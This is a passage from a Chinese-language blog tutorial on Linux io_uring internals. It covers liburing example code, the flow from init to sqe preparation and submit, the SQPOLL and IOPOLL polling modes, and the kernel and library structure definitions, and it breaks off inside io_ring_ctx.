class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备写操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;Read %d bytes: %s\n&quot;, cqe-&gt;res, buffer);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理并关闭文件</span></span><br><span class="line">    io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果要使用io_uring会经历如下流程：</p><p>首先通过 <code>io_uring_queue_init</code> 完成了初始化，io_uring的sq和cq队列也被创建</p><p>在库内部实际上是使用 <code>io_uring_setup</code> 和 <code>mmap</code> 两个syscall实现</p><p>前者完成了内核中相应结构体和资源的创建，后者将两个队列映射到用户态内存，通过共享内存方便用户态访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，用户使用 <code>io_uring_get_sqe</code> 得到一个sqe，(SQ队列中的一个实体) ，并根据所要完成的任务，设置sqe的各个成员， 这个过程是完全在用户态完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line"><span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>最后，通过 <code>io_uring_submit</code> 提交了请求，库内部实际上是调用了 <code>io_uring_enter</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure><h3 id="io-uring任务收割模式">io_uring任务收割模式</h3><p>这里主要解释一下 <code>IORING_SETUP_SQPOLL</code> 和 <code>IORING_SETUP_IOPOLL</code> 的区别</p><blockquote><p>IORING_SETUP_SQPOLL<br>When this flag is specified, a kernel thread is created to<br>perform submission queue polling.  An io_uring instance<br>configured in this way enables an application to issue I/O<br>without ever context switching into the kernel.  By using<br>the submission queue to fill in new submission queue<br>entries and watching for completions on the completion<br>queue, the application can submit and reap I/Os without<br>doing a single system call.<br>If the kernel thread is idle for more than sq_thread_idle<br>milliseconds, it will set the IORING_SQ_NEED_WAKEUP bit in<br>the flags field of the struct io_sq_ring.  When this<br>happens, the application must call io_uring_enter(2) to<br>wake the kernel thread.  If I/O is kept busy, the kernel<br>thread will never sleep.  An application making use of<br>this feature will need to guard the io_uring_enter(2) call<br>with the following code sequence:<br>/*<br>* Ensure that the wakeup flag is read after the tail pointer<br>* has been written. It’s important to use memory load acquire<br>* semantics for the flags read, as otherwise the application<br>* and the kernel might not agree on the consistency of the<br>* wakeup flag.<br>*/<br>unsigned flags = atomic_load_relaxed(sq_ring-&gt;flags);<br>if (flags &amp; IORING_SQ_NEED_WAKEUP)<br>io_uring_enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP);</p></blockquote><blockquote><p>IORING_SETUP_IOPOLL<br>Perform busy-waiting for an I/O completion, as opposed to<br>getting notifications via an asynchronous IRQ (Interrupt<br>Request).  The file system (if any) and block device must<br>support polling in order for this to work.  Busy-waiting<br>provides lower latency, but may consume more CPU resources<br>than interrupt driven I/O.  Currently, this feature is<br>usable only on a file descriptor opened using the O_DIRECT<br>flag.  When a read or write is submitted to a polled<br>context, the application must poll for completions on the<br>CQ ring by calling io_uring_enter(2).  It is illegal to<br>mix and match polled and non-polled I/O on an io_uring<br>instance.<br>This is only applicable for storage devices for now, and<br>the storage device must be configured for polling. How to<br>do that depends on the device type in question. For NVMe<br>devices, the nvme driver must be loaded with the<br>poll_queues parameter set to the desired number of polling<br>queues. The polling queues will be shared appropriately<br>between the CPUs in the system, if the number is less than<br>the number of online CPU threads.</p></blockquote><p>即，SQPOLL 通过内核线程定时唤醒来收割任务<br>IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p><h3 id="struct">struct</h3><p>其次，需要在讲解前，介绍一下 liburing 和 内核暴露出的一些结构体：</p><h4 id="liburing">liburing</h4><p>首先是 <code>io_uring</code> 这是liburing 关于io_uring的核心管理结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> <span class="title">sq</span>;</span> <span class="comment">// sq 管理结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cq</span> <span class="title">cq</span>;</span> <span class="comment">// cq 管理结构体</span></span><br><span class="line"><span class="type">unsigned</span> flags;        <span class="comment">// setup时的flag设置</span></span><br><span class="line"><span class="comment">// 以下setup返回时写入params的一些信息</span></span><br><span class="line"><span class="type">int</span> ring_fd;           </span><br><span class="line"><span class="type">unsigned</span> features;   </span><br><span class="line"><span class="type">int</span> enter_ring_fd;</span><br><span class="line">__u8 int_flags;</span><br><span class="line">__u8 pad[<span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> pad2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sq</code>， sq的管理结构体， 这个结构体在6.5及以下的版本可以在内核中找到，在6.5以上的版本在内核中删除了，6.5以上存在io_rings，相当于io_uring_sq和io_uring_cq 的组合</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> *khead;</span><br><span class="line"><span class="type">unsigned</span> *ktail;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_mask` instead of `*kring_mask`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_mask;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_entries` instead of `*kring_entries`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_entries;</span><br><span class="line"><span class="type">unsigned</span> *kflags;</span><br><span class="line"><span class="type">unsigned</span> *kdropped;</span><br><span class="line"><span class="type">unsigned</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqes</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> sqe_head;</span><br><span class="line"><span class="type">unsigned</span> sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> ring_sz;</span><br><span class="line"><span class="type">void</span> *ring_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> ring_mask;</span><br><span class="line"><span class="type">unsigned</span> ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> pad[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在此着重解释一下ring_ptr和 sqes两个成员：<br>这两个成员，在没有设置NO_MMAP的情况下，都是由 <code>io_uring_setup</code> 后用mmap映射得到的。</p><p>ring_prt指向一连串内核用来处理io_uring时的信息，例如当前循环队列head和tail， <code>io_uring_setup</code> 返回时会设置 <code>io_uring_params</code> 中的 sq_off 结构，这个结构就记录了各个成员信息，相对于ring_ptr的偏移， 最后在 [[#io_uring_setup_ring_pointers]] 中设置相关变量指向和内核共享的内存区域中对应的偏移。</p><p>而sqes，就是真正的共享队列的区域</p><p>类似的，存在io_uring_cq 结构体</p><h4 id="kernel">kernel</h4><p>首先是<code>io_uring_params</code></p><p>他是<code>io_uring_setup</code> 传入的参数，同时，返回时，kernel会给此结构体相应成员赋值.</p><p>此结构体也是提供给用户态的API</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">__u32 sq_entries;</span><br><span class="line">__u32 cq_entries;</span><br><span class="line">__u32 flags;</span><br><span class="line">__u32 sq_thread_cpu;   <span class="comment">// 内核任务处理线程占用的cpu</span></span><br><span class="line">__u32 sq_thread_idle;  <span class="comment">// 内核任务处理线程最大闲置时间，</span></span><br><span class="line">   <span class="comment">// 见`IORING_SETUP_SQPOLL`</span></span><br><span class="line">__u32 features;</span><br><span class="line">__u32 wq_fd;</span><br><span class="line">__u32 resv[<span class="number">3</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">__u8flags;<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sqe</code> , 用来表征一个IO任务的sqe, 通过在sqes 环形队列上插入此结构体, 实现内核任务的提交.  其中大部分参数都是提交给相应的任务处理函数的参数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">// 任务的类型, 用一系列枚举变量来表示</span></span><br><span class="line">__u8flags;<span class="comment">// 任务的一些标志位, 可以设置任务的一些特性</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_ring_ctx</code> 是kernel  io_uring运行的上下文，记录了io_uring 运行时需要保存的一些信息，这里就不一一分析每个成员了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> &#123;</span></span><br><span class="line"><span class="comment">/* const or read-mostly hot data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_next: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>restricted: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>off_timeout_used: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_active: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>has_evfd: <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* all CQEs should be posted only by the submitter task */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>task_complete: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>lockless_cq: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>syscall_iopoll: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>poll_activated: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_disabled: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>compat: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">submitter_task</span>;</span></span><br><span class="line"><span 